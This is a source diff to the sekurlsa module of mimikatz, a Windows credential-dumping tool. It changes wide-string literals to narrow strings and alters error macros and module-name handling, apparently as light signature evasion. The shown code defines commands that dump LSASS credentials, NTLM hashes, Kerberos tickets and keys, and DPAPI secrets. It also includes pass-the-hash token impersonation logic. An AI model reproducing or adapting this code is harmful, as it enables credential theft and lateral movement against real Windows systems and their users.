@@ -6,41 +6,41 @@
 #include "kuhl_m_sekurlsa.h"
 
 const KUHL_M_C kuhl_m_c_sekurlsa[] = {
-	{kuhl_m_sekurlsa_msv,				L"msv",				L"Lists LM & NTLM credentials"},
-	{kuhl_m_sekurlsa_wdigest,			L"wdigest",			L"Lists WDigest credentials"},
-	{kuhl_m_sekurlsa_kerberos,			L"kerberos",		L"Lists Kerberos credentials"},
-	{kuhl_m_sekurlsa_tspkg,				L"tspkg",			L"Lists TsPkg credentials"},
+	{kuhl_m_sekurlsa_msv,				"msv",				"Lists LM & NTLM credentials"},
+	{kuhl_m_sekurlsa_wdigest,			"wdigest",			"Lists WDigest credentials"},
+	{kuhl_m_sekurlsa_kerberos,			"kerberos",		"Lists Kerberos credentials"},
+	{kuhl_m_sekurlsa_tspkg,				"tspkg",			"Lists TsPkg credentials"},
 #if !defined(_M_ARM64)
-	{kuhl_m_sekurlsa_livessp,			L"livessp",			L"Lists LiveSSP credentials"},
+	{kuhl_m_sekurlsa_livessp,			"livessp",			"Lists LiveSSP credentials"},
 #endif
-	{kuhl_m_sekurlsa_cloudap,			L"cloudap",			L"Lists CloudAp credentials"},
-	{kuhl_m_sekurlsa_ssp,				L"ssp",				L"Lists SSP credentials"},
-	{kuhl_m_sekurlsa_all,				L"logonPasswords",	L"Lists all available providers credentials"},
+	{kuhl_m_sekurlsa_cloudap,			"cloudap",			"Lists CloudAp credentials"},
+	{kuhl_m_sekurlsa_ssp,				"ssp",				"Lists SSP credentials"},
+	{kuhl_m_sekurlsa_all,				"logonPasswords",	"Lists all available providers credentials"},
 
-	{kuhl_m_sekurlsa_process,			L"process",			L"Switch (or reinit) to LSASS process  context"},
-	{kuhl_m_sekurlsa_minidump,			L"minidump",		L"Switch (or reinit) to LSASS minidump context"},
-	{kuhl_m_sekurlsa_sk_bootKey,		L"bootkey",			L"Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials"},
-	{kuhl_m_sekurlsa_pth,				L"pth",				L"Pass-the-hash"},
+	{kuhl_m_sekurlsa_process,			"process",			"Switch (or reinit) to LSASS process  context"},
+	{kuhl_m_sekurlsa_minidump,			"minidump",		"Switch (or reinit) to LSASS minidump context"},
+	{kuhl_m_sekurlsa_sk_bootKey,		"bootkey",			"Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials"},
+	{kuhl_m_sekurlsa_pth,				"pth",				"Pass-the-hash"},
 #if !defined(_M_ARM64)
-	{kuhl_m_sekurlsa_krbtgt,			L"krbtgt",			L"krbtgt!"},
+	{kuhl_m_sekurlsa_krbtgt,			"krbtgt",			"krbtgt!"},
 #endif
-	{kuhl_m_sekurlsa_dpapi_system,		L"dpapisystem",		L"DPAPI_SYSTEM secret"},
+	{kuhl_m_sekurlsa_dpapi_system,		"dpapisystem",		"DPAPI_SYSTEM secret"},
 #if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
-	{kuhl_m_sekurlsa_trust,				L"trust",			L"Antisocial"},
-	{kuhl_m_sekurlsa_bkeys,				L"backupkeys",		L"Preferred Backup Master keys"},
+	{kuhl_m_sekurlsa_trust,				"trust",			"Antisocial"},
+	{kuhl_m_sekurlsa_bkeys,				"backupkeys",		"Preferred Backup Master keys"},
 #endif
-	{kuhl_m_sekurlsa_kerberos_tickets,	L"tickets",			L"List Kerberos tickets"},
-	{kuhl_m_sekurlsa_kerberos_keys,		L"ekeys",			L"List Kerberos Encryption Keys"},
-	{kuhl_m_sekurlsa_dpapi,				L"dpapi",			L"List Cached MasterKeys"},
-	{kuhl_m_sekurlsa_credman,			L"credman",			L"List Credentials Manager"},
+	{kuhl_m_sekurlsa_kerberos_tickets,	"tickets",			"List Kerberos tickets"},
+	{kuhl_m_sekurlsa_kerberos_keys,		"ekeys",			"List Kerberos Encryption Keys"},
+	{kuhl_m_sekurlsa_dpapi,				"dpapi",			"List Cached MasterKeys"},
+	{kuhl_m_sekurlsa_credman,			"credman",			"List Credentials Manager"},
 };
 
 const KUHL_M kuhl_m_sekurlsa = {
-	L"sekurlsa",	L"SekurLSA module",	L"Some commands to enumerate credentials...",
+	L"sekurlsa",	L"SekurLSA module",	"Some commands to enumerate credentials...",
 	ARRAYSIZE(kuhl_m_c_sekurlsa), kuhl_m_c_sekurlsa, kuhl_m_sekurlsa_init, kuhl_m_sekurlsa_clean
 };
 
-KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kdcsvc_package = {L"kdc", NULL, FALSE, L"kdcsvc.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
+KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kdcsvc_package = {"kdc", NULL, FALSE, "kdcsvc.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
 const PKUHL_M_SEKURLSA_PACKAGE lsassPackages[] = {
 	&kuhl_m_sekurlsa_msv_package,
 	&kuhl_m_sekurlsa_tspkg_package,
@@ -265,7 +265,7 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 			if(!NT_SUCCESS(status))
 				CloseHandle(hData);
 		}
-		else PRINT_ERROR_AUTO(L"Handle on memory");
+		else PRINT_ERROR_AUTO_C("Handle on memory");
 
 		if(!NT_SUCCESS(status))
 			cLsass.hLsassMem = kull_m_memory_close(cLsass.hLsassMem);
@@ -278,11 +278,13 @@ BOOL CALLBACK kuhl_m_sekurlsa_findlibs(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMA
 	ULONG i;
 	for(i = 0; i < ARRAYSIZE(lsassPackages); i++)
 	{
-		if(_wcsicmp(lsassPackages[i]->ModuleName, pModuleInformation->NameDontUseOutsideCallback->Buffer) == 0)
+		wchar_t *modulename = kull_m_string_qad_ansi_to_unicode(lsassPackages[i]->ModuleName);
+		if(_wcsicmp(modulename, pModuleInformation->NameDontUseOutsideCallback->Buffer) == 0)
 		{
 			lsassPackages[i]->Module.isPresent = TRUE;
 			lsassPackages[i]->Module.Informations = *pModuleInformation;
 		}
+		LocalFree(modulename);
 	}
 	return TRUE;
 }
@@ -394,7 +396,7 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_logondata(IN PKIWI_BASIC_SECURITY_LO
 			{
 				if(pLsassData->lsassPackages[i]->Module.isPresent && lsassPackages[i]->isValid)
 				{
-					kprintf(L"\t%s :\t", pLsassData->lsassPackages[i]->Name);
+					kprintf(L"\t%hs :\t", pLsassData->lsassPackages[i]->Name);
 					pLsassData->lsassPackages[i]->CredsForLUIDFunc(pData);
 					kprintf(L"\n");
 				}
@@ -978,24 +980,24 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 								{
 									if(SetThreadToken(NULL, hNewToken))
 										kprintf(L"** Token Impersonation **\n");
-									else PRINT_ERROR_AUTO(L"SetThreadToken");
+									else PRINT_ERROR_AUTO_C("SetThreadToken");
 									CloseHandle(hNewToken);
 								}
-								else PRINT_ERROR_AUTO(L"DuplicateTokenEx");
+								else PRINT_ERROR_AUTO_C("DuplicateTokenEx");
 								NtTerminateProcess(processInfos.hProcess, STATUS_SUCCESS);
 							}
 							else NtResumeProcess(processInfos.hProcess);
 						}
 						else NtTerminateProcess(processInfos.hProcess, STATUS_PROCESS_IS_TERMINATING);
 					}
-					else PRINT_ERROR_AUTO(L"GetTokenInformation");
+					else PRINT_ERROR_AUTO_C("GetTokenInformation");
 					CloseHandle(hToken);
 				}
-				else PRINT_ERROR_AUTO(L"OpenProcessToken");
+				else PRINT_ERROR_AUTO_C("OpenProcessToken");
 				CloseHandle(processInfos.hThread);
 				CloseHandle(processInfos.hProcess);
 			}
-			else PRINT_ERROR_AUTO(L"CreateProcessWithLogonW");
+			else PRINT_ERROR_AUTO_C("CreateProcessWithLogonW");
 		}
 		else PRINT_ERROR(L"Bas user or LUID\n");
 	}
@@ -1029,7 +1031,7 @@ VOID kuhl_m_sekurlsa_pth_luid(PSEKURLSA_PTH_DATA data)
 					cLsass.hLsassMem->pHandleProcess->hProcess = hTemp;
 					kprintf(L"is now R/W\n");
 				}
-				else PRINT_ERROR_AUTO(L"OpenProcess");
+				else PRINT_ERROR_AUTO_C("OpenProcess");
 
 				//if(isRWok = DuplicateHandle(GetCurrentProcess(), cLsass.hLsassMem->pHandleProcess->hProcess, GetCurrentProcess(), &hTemp, bi.GrantedAccess | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, 0)) // FAIL :(
 				//{
@@ -1037,7 +1039,7 @@ VOID kuhl_m_sekurlsa_pth_luid(PSEKURLSA_PTH_DATA data)
 				//	cLsass.hLsassMem->pHandleProcess->hProcess = hTemp;
 				//	kprintf(L"is now R/W\n");
 				//}
-				//else PRINT_ERROR_AUTO(L"DuplicateHandle");
+				//else PRINT_ERROR_AUTO_C("DuplicateHandle");
 			}
 		}
 		else PRINT_ERROR(L"NtQueryObject: %08x\n", status);
@@ -1347,7 +1349,7 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 						{
 							if(kuhl_m_sekurlsa_genericLsaIsoOutput(blob, &lsaIsoOutput, &cbLsaIsoOutput))
 							{
-								kprintf(L"\n\t     * Password: ");
+								kprintf(L"%hs", "\n\t     * Password: ");
 								buffer.Length = buffer.MaximumLength = (USHORT) cbLsaIsoOutput;
 								buffer.Buffer = (PWSTR) lsaIsoOutput;
 								if((cbLsaIsoOutput < USHRT_MAX) && kull_m_string_suspectUnicodeString(&buffer))
@@ -1423,7 +1425,7 @@ VOID kuhl_m_sekurlsa_trymarshal(PCUNICODE_STRING MarshaledCredential)
 					}
 					CredFree(Credential);
 				}
-				else PRINT_ERROR_AUTO(L"CredUnmarshalCredential");
+				else PRINT_ERROR_AUTO_C("CredUnmarshalCredential");
 			}
 			LocalFree(buffer);
 		}
